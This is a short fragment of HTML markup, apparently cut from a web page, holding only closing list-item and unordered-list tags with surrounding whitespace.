             </li>
             
         </ul>
